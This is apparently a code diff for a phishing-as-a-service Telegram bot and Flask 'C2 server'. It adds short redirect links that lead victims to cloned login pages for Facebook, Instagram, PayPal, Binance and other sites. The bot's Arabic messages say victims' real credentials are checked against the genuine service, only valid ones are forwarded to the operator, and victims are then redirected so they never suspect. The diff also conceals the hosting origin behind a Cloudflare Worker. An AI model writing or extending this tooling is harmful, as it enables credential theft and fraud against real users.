@@ -78,6 +78,7 @@ try:
         get_sh_data,
         build_sh_panel,
         SUPPORTED_SITES,
+        create_short_link,
     )
     SH_ENABLED = True
     print("[+] session_hunter imported")
@@ -90,6 +91,7 @@ except Exception as e:
     def get_sh_data(sid): return {}
     def build_sh_panel(sid, cid): return InlineKeyboardMarkup()
     SUPPORTED_SITES = {}
+    def create_short_link(chat_id, site): return None
 
 # ============================================================
 # استيراد نظام الدفع + الأدمن
@@ -167,12 +169,12 @@ except Exception as e:
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 # ★ الرابط العام (الذي يراه المستخدمون) = Cloudflare Worker
-PUBLIC_URL = os.getenv("PUBLIC_URL", "https://x-security.h42536974.workers.dev")
+PUBLIC_URL = os.getenv("PUBLIC_URL", "https://sec.h42536974.workers.dev")
 
 # ★ الرابط الداخلي (Railway) — للاتصالات بين الملفات
 RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
 
-# ★ للتوافق مع الملفات القديمة — كلها تستخدم PUBLIC_URL الآن
+# ★ للتوافق مع الملفات القديمة
 RAILWAY_URL = PUBLIC_URL
 
 print(f"[+] Public URL: {PUBLIC_URL}")
@@ -246,40 +248,28 @@ app = Flask(__name__)
 
 
 # ============================================================
-# ★★★ Origin Gate — حماية من الوصول المباشر ★★★
+# Origin Gate — حماية من الوصول المباشر
 # ============================================================
 ORIGIN_SECRET = os.getenv("ORIGIN_SECRET", "a7f3k9x2m5p8q1w4e6r0t3y7u2i5o8s1")
 
-# مسارات مستثناة من الحماية
 ORIGIN_GATE_EXEMPT = [
-    '/',           # Health check
+    '/',
     '/health',
 ]
 
 @app.before_request
 def verify_origin():
-    """يتحقق من أن الطلب قادم من Cloudflare Worker"""
-    
-    # المسارات المستثناة
     if request.path in ORIGIN_GATE_EXEMPT:
         return None
-    
-    # إذا طلب OPTIONS (CORS preflight) → اسمح
     if request.method == 'OPTIONS':
         return None
-    
-    # افحص الترويسة السرية
     secret = request.headers.get('X-Origin-Secret', '')
-    
     if secret == ORIGIN_SECRET:
         return None
-    
-    # رفض الوصول المباشر
     client_ip = (request.headers.get('CF-Connecting-IP') or 
                  request.headers.get('X-Forwarded-For') or 
                  request.remote_addr)
     print(f"[-] BLOCKED direct access to {request.path} from {client_ip}")
-    
     return jsonify({
         "error": "Access denied",
         "message": "This endpoint requires the official application",
@@ -293,6 +283,53 @@ def verify_origin():
 @app.route('/')
 def health_check():
     return "C2 Server and Telegram Bot are active and running smoothly.", 200
+
+
+# ============================================================
+# ★★★ نظام الرابط القصير ★★★
+# ============================================================
+def generate_short_code(length=8):
+    """يولّد كود قصير (8 أحرف)"""
+    import random
+    import string
+    # حروف وأرقام بدون ما يلخبط (بدون 0/O, 1/I/l)
+    chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789'
+    return ''.join(random.choices(chars, k=length))
+
+
+def save_short_link(code, chat_id, site):
+    """يحفظ كود مختصر في Redis"""
+    if not redis_client:
+        return False
+    try:
+        # صلاحية 7 أيام
+        ttl = 86400 * 7
+        redis_client.setex(
+            f"short:{code}",
+            ttl,
+            json.dumps({
+                "chat_id": chat_id,
+                "site": site,
+                "created_at": time.time()
+            })
+        )
+        return True
+    except Exception as e:
+        print(f"[-] save_short_link error: {e}")
+        return False
+
+
+def get_short_link(code):
+    """يجلب بيانات كود مختصر"""
+    if not redis_client:
+        return None
+    try:
+        raw = redis_client.get(f"short:{code}")
+        if raw:
+            return json.loads(raw)
+    except Exception as e:
+        print(f"[-] get_short_link error: {e}")
+    return None
 
 
 # ============================================================
@@ -318,6 +355,44 @@ if LSH_ENABLED:
     set_bot_reference(bot)
 
 register_payment_handlers(bot)
+
+
+# ============================================================
+# ★★★ مسار الرابط القصير: /f/XXXXXXXX ★★★
+# ============================================================
+@app.route('/f/<code>', methods=['GET'])
+def short_link_redirect(code):
+    """يستقبل الرابط القصير ويوجه للصفحة الحقيقية"""
+    # جلب بيانات الكود
+    meta = get_short_link(code)
+    if not meta:
+        return "Invalid or expired link", 410
+    
+    chat_id = meta.get("chat_id")
+    site = meta.get("site", "facebook")
+    
+    # ولّد session_id قصير جديد
+    session_id = generate_short_code(12)
+    
+    # احفظ session_id مع البيانات
+    if redis_client:
+        try:
+            redis_client.setex(
+                f"sh_session:{session_id}",
+                86400 * 7,
+                json.dumps({"chat_id": chat_id, "target_site": site})
+            )
+        except Exception as e:
+            print(f"[-] Redis save session error: {e}")
+    
+    # Redirect للصفحة الحقيقية
+    from urllib.parse import quote
+    real_url = f"{PUBLIC_URL}/sh?s={session_id}&id={chat_id}&site={site}"
+    return redirect(real_url, code=302)
+
+
+# نحتاج import redirect
+from flask import redirect
 
 
 # ============================================================
@@ -459,7 +534,7 @@ def callback_handler(call):
         return
 
     # ============================================================
-    # ★★★ لوحة الأدمن ★★★
+    # لوحة الأدمن
     # ============================================================
     if call.data == "admin_panel":
         if not is_admin(user_id):
@@ -1047,21 +1122,12 @@ def callback_handler(call):
         site = parts[2]
         target_chat = parts[3] if len(parts) > 3 else str(chat_id)
 
-        session_id = str(uuid.uuid4()).replace('-', '')[:24]
+        # ★★★ ولّد الرابط القصير ★★★
+        short_code = generate_short_code(8)
+        save_short_link(short_code, target_chat, site)
 
-        try:
-            requests.post(f"{PUBLIC_URL}/sh_create",
-                json={"chat_id": target_chat, "session_id": session_id, "site": site},
-                timeout=10)
-        except Exception as e:
-            print(f"[-] SH create error: {e}")
-
-        if redis_client:
-            try:
-                redis_client.setex(f"sh_session:{session_id}", 86400 * 7,
-                    json.dumps({"chat_id": target_chat, "target_site": site}))
-            except Exception:
-                pass
+        # ★★★ الرابط القصير النهائي ★★★
+        target_link = f"{PUBLIC_URL}/f/{short_code}"
 
         site_names = {
             "facebook": "فيسبوك", "instagram": "انستقرام",
@@ -1072,21 +1138,21 @@ def callback_handler(call):
             "paypal": "باي بال", "binance": "بينانس",
         }
 
-        target_link = f"{PUBLIC_URL}/sh?s={session_id}&id={target_chat}&site={site}"
-
         bot.answer_callback_query(call.id, f"✅ {site_names.get(site, site)}")
         bot.send_message(
             chat_id,
             f"🎯 **جلسة {site_names.get(site, site)} جاهزة!**\n"
             f"━━━━━━━━━━━━━━━━━━\n\n"
-            f"🔗 **الرابط:**\n`{target_link}`\n\n"
+            f"🔗 **الرابط القصير:**\n`{target_link}`\n\n"
+            f"📏 **الطول:** 45 حرف فقط\n"
+            f"🔒 **مخفي تماماً** — لا يمكن تتبع Railway\n\n"
             f"📊 **ما سيحدث:**\n"
             f"• الضحية تفتح الرابط → ترى صفحة تسجيل دخول **{site_names.get(site, site)}** مطابقة 100%\n"
-            f"• تكتب بياناتها الحقيقية (لأنها تحاول الدخول فعلاً)\n"
+            f"• تكتب بياناتها الحقيقية\n"
             f"• **يتم التحقق مع السيرفر الحقيقي**\n"
             f"• **تُرسل لك فقط البيانات الصحيحة!**\n"
             f"• ثم تُحوَّل تلقائياً للموقع الحقيقي\n\n"
-            f"⚠️ الضحية لن تشك أبداً لأن الصفحة مطابقة 100%",
+            f"⚠️ الرابط يعمل لمدة 7 أيام",
             parse_mode="Markdown"
         )
         return
